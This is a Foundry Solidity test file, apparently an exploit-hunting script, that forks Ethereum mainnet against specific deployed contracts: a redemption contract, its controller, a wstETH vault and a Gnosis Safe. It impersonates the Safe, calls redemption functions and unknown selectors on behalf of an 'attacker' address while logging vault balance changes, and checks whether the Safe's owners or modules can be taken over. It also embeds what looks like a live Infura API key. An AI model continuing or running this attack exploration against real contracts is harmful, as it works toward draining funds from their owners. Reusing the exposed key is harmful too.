// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IGnosisSafe {
    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function isOwner(address owner) external view returns (bool);
    function getModulesPaginated(address start, uint256 pageSize) external view returns (address[] memory array, address next);
    function isModuleEnabled(address module) external view returns (bool);
    function nonce() external view returns (uint256);
    function execTransaction(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes memory signatures
    ) external payable returns (bool success);
}

contract SafeExploitPath is Test {
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    // The Safe at slot 4 of REDEMPTION_1
    address constant SLOT4_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant GNOSIS_SINGLETON = 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeSafeAtSlot4() public view {
        console.log("=== ANALYZING SAFE AT SLOT4 ===\n");

        IGnosisSafe safe = IGnosisSafe(SLOT4_SAFE);

        console.log("Safe address:", SLOT4_SAFE);

        // Get owners
        try safe.getOwners() returns (address[] memory owners) {
            console.log("\nOwners (", owners.length, "):");
            for (uint i = 0; i < owners.length; i++) {
                console.log("  ", owners[i]);
            }
        } catch {
            console.log("getOwners() failed");
        }

        // Get threshold
        try safe.getThreshold() returns (uint256 threshold) {
            console.log("Threshold:", threshold);
        } catch {
            console.log("getThreshold() failed");
        }

        // Get nonce
        try safe.nonce() returns (uint256 n) {
            console.log("Nonce:", n);
        } catch {
            console.log("nonce() failed");
        }

        // Check modules
        console.log("\nModules:");
        try safe.getModulesPaginated(address(0x1), 10) returns (address[] memory modules, address) {
            console.log("Module count:", modules.length);
            for (uint i = 0; i < modules.length; i++) {
                if (modules[i] != address(0)) {
                    console.log("  ", modules[i]);
                }
            }
        } catch {
            console.log("getModulesPaginated() failed");
        }

        // Check if Safe holds any tokens
        console.log("\nSafe balances:");
        console.log("wstETH:", IERC20(wstETH).balanceOf(SLOT4_SAFE));
        console.log("ETH:", SLOT4_SAFE.balance);
    }

    function test_IsSafeRegisteredInRC() public view {
        console.log("=== CHECKING IF SAFE IS REGISTERED IN RC ===\n");

        // Check if the Safe is registered as a redemption in RC
        bytes32 key = keccak256(abi.encode(SLOT4_SAFE, uint256(4)));
        bytes32 val = vm.load(REDEMPTION_CONTROLLER, key);

        console.log("Registration check:");
        console.logBytes32(val);

        if (val != bytes32(0)) {
            console.log("*** SAFE IS REGISTERED IN RC! ***");
        } else {
            console.log("Safe is NOT registered in RC");
        }
    }

    function test_WhatIsSafeUsedFor() public view {
        console.log("=== WHAT IS SAFE USED FOR IN REDEMPTION_1 ===\n");

        // The Safe is at slot 4 of REDEMPTION_1
        // Let's see what REDEMPTION_1 functions use slot 4

        bytes memory code = REDEMPTION_1.code;

        // Find PUSH1 4 + SLOAD patterns
        console.log("Finding slot 4 usage in REDEMPTION_1:");

        for (uint i = 0; i + 2 < code.length; i++) {
            if (uint8(code[i]) == 0x60 && uint8(code[i+1]) == 0x04 && uint8(code[i+2]) == 0x54) {
                console.log("PUSH1 4 + SLOAD at:", i);

                // Look for what happens after (CALL, DELEGATECALL, etc)
                for (uint j = i; j < i + 100 && j < code.length; j++) {
                    if (uint8(code[j]) == 0xf1) {
                        console.log("  -> CALL at:", j);
                        break;
                    }
                    if (uint8(code[j]) == 0xf4) {
                        console.log("  -> DELEGATECALL at:", j);
                        break;
                    }
                    if (uint8(code[j]) == 0xfa) {
                        console.log("  -> STATICCALL at:", j);
                        break;
                    }
                }
            }
        }

        // Also look for any PUSH20 of Safe address
        bytes memory safeBytes = abi.encodePacked(SLOT4_SAFE);
        console.log("\nSearching for Safe address hardcoded:");
        for (uint i = 0; i + 20 < code.length; i++) {
            bool match_ = true;
            for (uint j = 0; j < 20 && match_; j++) {
                if (code[i + j] != safeBytes[j]) match_ = false;
            }
            if (match_) {
                console.log("  Found at offset:", i);
            }
        }
    }

    function test_TryCallRedemption1AsSafe() public {
        console.log("=== TRYING TO CALL REDEMPTION_1 AS SAFE ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // If the Safe can call REDEMPTION_1 functions that trigger RC.redeem...
        // The recipient would be the Safe, and then we'd need to extract from Safe

        vm.startPrank(SLOT4_SAFE);

        // Try calling finalizeRedeem
        console.log("Calling REDEMPTION_1.finalizeRedeem as Safe:");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Success:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // Try calling various functions
        bytes4[] memory sels = new bytes4[](5);
        sels[0] = bytes4(0x9307e802);
        sels[1] = bytes4(0xfd424ea8);
        sels[2] = bytes4(0xc5d664c6);
        sels[3] = bytes4(0xeda72134);
        sels[4] = bytes4(0xcff50c6e);

        console.log("\nTrying other selectors:");
        for (uint i = 0; i < sels.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], attacker)
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 safeWstETH = IERC20(wstETH).balanceOf(SLOT4_SAFE);

        console.log("\nResults:");
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Safe wstETH:", safeWstETH);
    }

    function test_CanWeControlSafe() public {
        console.log("=== CAN WE CONTROL THE SAFE? ===\n");

        IGnosisSafe safe = IGnosisSafe(SLOT4_SAFE);

        // Check Safe owners
        address[] memory owners;
        try safe.getOwners() returns (address[] memory o) {
            owners = o;
            console.log("Safe owners:");
            for (uint i = 0; i < owners.length; i++) {
                console.log("  ", owners[i]);
            }
        } catch {
            console.log("Failed to get owners");
            return;
        }

        // Check if any owner is exploitable
        for (uint i = 0; i < owners.length; i++) {
            address owner = owners[i];
            console.log("\nChecking owner:", owner);
            console.log("  Code size:", owner.code.length);

            if (owner.code.length > 0) {
                // It's a contract - check its owner/admin
                (bool s, bytes memory d) = owner.staticcall(
                    abi.encodeWithSignature("owner()")
                );
                if (s && d.length >= 32) {
                    address ownerOfOwner = abi.decode(d, (address));
                    console.log("  owner():", ownerOfOwner);

                    // Check pendingOwner
                    (bool s2, bytes memory d2) = owner.staticcall(
                        abi.encodeWithSignature("pendingOwner()")
                    );
                    if (s2 && d2.length >= 32) {
                        address pending = abi.decode(d2, (address));
                        if (pending != address(0)) {
                            console.log("  *** PENDING OWNER:", pending);
                        }
                    }
                }
            }
        }

        // Check Safe modules
        console.log("\nChecking Safe modules:");
        try safe.getModulesPaginated(address(0x1), 10) returns (address[] memory modules, address) {
            if (modules.length == 0) {
                console.log("No modules enabled");
            } else {
                for (uint i = 0; i < modules.length; i++) {
                    if (modules[i] != address(0)) {
                        console.log("Module:", modules[i]);

                        // Check if module is exploitable
                        (bool s, bytes memory d) = modules[i].staticcall(
                            abi.encodeWithSignature("owner()")
                        );
                        if (s && d.length >= 32) {
                            console.log("  Module owner:", abi.decode(d, (address)));
                        }
                    }
                }
            }
        } catch {
            console.log("Failed to get modules");
        }
    }

    function test_SafeAsRedemptionTreasury() public view {
        console.log("=== IS SAFE THE TREASURY? ===\n");

        // Maybe the Safe at slot 4 is the "treasury" that receives fees
        // If so, maybe there's a way to claim treasury funds

        // Check what slot 4 is typically used for
        console.log("REDEMPTION_1 storage interpretation:");
        console.log("Slot 0: owner");
        console.log("Slot 1: pendingOwner");
        console.log("Slot 2: initialized");
        console.log("Slot 3: ???");
        console.log("Slot 4: Safe (treasury?)");
        console.log("Slot 5: implementation");

        // Check if Safe has any wstETH
        uint256 safeBalance = IERC20(wstETH).balanceOf(SLOT4_SAFE);
        console.log("\nSafe wstETH balance:", safeBalance);

        // Check if there are fees accumulated
        // Treasury typically receives protocol fees
    }

    function test_FindTreasuryFunction() public view {
        console.log("=== FINDING TREASURY FUNCTION ===\n");

        // Search for treasury() function
        bytes4 treasurySel = bytes4(keccak256("treasury()"));
        console.log("treasury() selector:");
        console.logBytes4(treasurySel);

        // Try calling it
        (bool s, bytes memory d) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("treasury()")
        );
        if (s && d.length >= 32) {
            address treasury = abi.decode(d, (address));
            console.log("treasury():", treasury);

            if (treasury == SLOT4_SAFE) {
                console.log("*** SLOT4 SAFE IS THE TREASURY! ***");
            }
        }

        // Also check feeRecipient
        (bool s2, bytes memory d2) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("feeRecipient()")
        );
        if (s2 && d2.length >= 32) {
            console.log("feeRecipient():", abi.decode(d2, (address)));
        }

        // And protocolFeeRecipient
        (bool s3, bytes memory d3) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("protocolFeeRecipient()")
        );
        if (s3 && d3.length >= 32) {
            console.log("protocolFeeRecipient():", abi.decode(d3, (address)));
        }
    }
}
